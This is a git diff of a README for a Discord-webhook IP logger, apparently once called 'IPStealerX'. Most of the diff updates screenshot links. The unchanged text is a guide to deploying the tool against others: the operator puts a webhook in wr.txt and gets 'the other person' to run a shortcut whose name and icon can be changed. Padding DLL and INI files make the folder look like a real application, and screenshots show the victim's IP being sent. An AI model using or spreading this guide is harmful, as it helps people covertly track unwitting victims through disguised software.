@@ -4,21 +4,25 @@ Go to releases and download the latest version.
 ## To Setup
 It takes 5 minutes. Please avoid running the program. `Go into the installed directory > ApplicationFiles > ApplicationFiles > bin > Debug > wr.txt`.  
 
-![Screenshot 2023-06-15 132026](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/3352cca6-2f27-429e-b95f-af3325f3b3b7) 
- 
+![Screenshot 2023-06-15 132026](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/df8c2b3c-11c9-4c04-a98f-19d1788187ea)
+
 
 Enter your discord webhook inside `wr.txt`.
 
-![Screenshot 2023-06-15 132412](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/27e237cc-0072-47a8-b46a-e8647b912d21)
+![Screenshot 2023-06-15 132412](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/2c47d86f-5fe4-42ce-afb0-51b1a9da19c7)
+
+
 
 Now the other person must run the shortcut in the installed directory. The shortcut can be edited - name and icon.
 
-![Screenshot 2023-06-15 132651](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/f5960048-7277-468e-8fab-975820866db5)
+![Screenshot 2023-06-15 132559](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/efa0c48d-da8b-4579-b906-4c73f45cd7b4)
+
 
 Try using on yourself first, test to see what your working with.
 
 
-![Screenshot 2023-06-15 125923](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/f995b3c3-3e2b-403b-a2f4-d1de630aacf3)
+![Screenshot 2023-06-15 125923](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/9fec6020-a25a-4aa2-b3b9-86d49730e255)
+
 
 **THE FOLLOWING PICTURE IS JUST A DEMO, ON THE FULL VERSION IT WILL SHOW THESE FIELDS!**
 
@@ -29,22 +33,28 @@ And boom! Just like that. You are ready to share this program to other users.
 **When sending has began:**
 
 
-![Screenshot 2023-06-15 132904](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/76c8ea32-e245-4418-a232-295b85da33f6)
+![Screenshot 2023-06-15 132904](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/c2891ebe-557c-47c2-b5df-cafe90709cb9)
 
 
 **When Sending has ended (ip is sent):**
 
 
-![Screenshot 2023-06-15 132914](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/a66678cd-e0d5-4a25-8d9e-0b3d172c796d)
+![Screenshot 2023-06-15 132914](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/3f64c52e-da24-4038-8150-ff8406d21288)
+
 
 ## Delete the following before use:
 
 
-![Screenshot 2023-06-15 133206](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/a20d5d0e-0017-4898-b022-3af0a383f06a)
+![Screenshot 2023-06-15 133206](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/558e99f8-a23c-4b9b-bbf4-cfc6ff7bf9f2)
+
+
+
 ## Files you can remove if you want to:
 
 
-![image](https://github.com/AyanTheDeveloper/IPStealerX/assets/110039634/76067430-ee78-40a3-bc67-8b9f6583a76d)
+![Screenshot 2023-06-15 134327](https://github.com/AyanTheDeveloper/Custom-Discord-Webhook-IP-Logger/assets/110039634/41718a0c-91fa-41eb-af7f-2d9d498a6a83)
+
+
 **DLL AND INI FILES EXCEPT CSCORD.DLL CAN BE REMOVED. THEY ARE ADDED TO MAKE THE APPLICATION FOLDER LOOK LIKE AN ACTUAL APPLICATION.**
 
 ## Is it dualhooked?
